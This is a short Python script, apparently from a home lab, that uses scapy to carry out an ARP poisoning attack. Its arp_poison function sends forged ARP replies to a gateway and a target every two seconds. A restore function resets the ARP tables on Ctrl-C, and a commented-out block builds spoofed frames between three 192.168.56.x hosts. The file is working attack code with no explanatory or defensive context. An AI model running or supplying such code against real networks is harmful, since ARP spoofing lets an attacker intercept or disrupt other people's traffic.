from scapy.layers.l2 import Ether, ARP, getmacbyip
from scapy import route
from scapy.sendrecv import sendp, send
import time

#macM3 = "08:00:27:af:ee:33"
ipM3 = "192.168.56.103"
print(getmacbyip(ipM3))


def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)


def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)


"""macM1 = "08:00:27:d5:68:72"
ipM1 = "192.168.56.101"

macM2 = "08:00:27:d0:ed:b3"
ipM2 = "192.168.56.102"

arpM1 = Ether() / ARP()
arpM1[Ether].src = macM3
arpM1[ARP].hwsrc = macM3
arpM1[ARP].psrc = ipM2
arpM1[ARP].hwdst = macM1
arpM1[ARP].pdst = ipM1

arpM2 = Ether() / ARP()
arpM2[Ether].src = macM3
arpM2[ARP].hwsrc = macM3
arpM2[ARP].psrc = ipM1
arpM2[ARP].hwdst = macM2
arpM2[ARP].pdst = ipM2

sendp(arpM1 / arpM2, iface="enp0s3", loop=1, inter=1)"""